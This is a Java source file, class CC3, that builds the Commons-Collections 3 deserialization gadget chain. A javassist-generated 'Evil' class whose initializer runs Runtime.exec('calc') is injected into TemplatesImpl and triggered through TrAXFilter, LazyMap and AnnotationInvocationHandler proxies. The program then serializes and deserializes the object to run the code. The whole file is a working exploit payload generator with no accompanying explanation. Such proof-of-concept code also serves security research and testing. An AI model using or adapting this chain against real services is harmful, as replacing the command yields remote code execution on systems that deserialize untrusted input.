import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javax.xml.transform.Templates;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.util.Map;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;


public class CC3 {
    public static void main(String[] args) throws Exception {
        ClassPool pool =ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc=pool.makeClass("Evil");
        String cmd="java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String rename="Evil"+System.nanoTime();
        cc.setName(rename);
        byte[] bytes=cc.toBytecode();
        byte[][] target=new byte[][]{bytes};


        TemplatesImpl templates=new TemplatesImpl();
        Field name=templates.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"test");

        Field bytecodes=templates.getClass().getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,target);

        Field tfactory=templates.getClass().getDeclaredField("_tfactory");
        tfactory.setAccessible(true);

        tfactory.set(templates,new TransformerFactoryImpl());


        ConstantTransformer ct=new ConstantTransformer(TrAXFilter.class);
        InstantiateTransformer it=new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates});
        ChainedTransformer chain=new ChainedTransformer(new Transformer[]{ct,it});

        
        Class<?> clazz=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons =clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);


        HashMap map=new HashMap();
        Map lazyMap=LazyMap.decorate(map,chain);
        InvocationHandler handler1=(InvocationHandler)cons.newInstance(Override.class,lazyMap);

        Map proxymap=(Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class},  handler1);
        Object handler2=cons.newInstance(Override.class,proxymap);

        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(handler2);
        oos.close();
        byte[] payload=baos.toByteArray();

        ByteArrayInputStream bais=new ByteArrayInputStream(payload);
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
        ois.close();


    }
}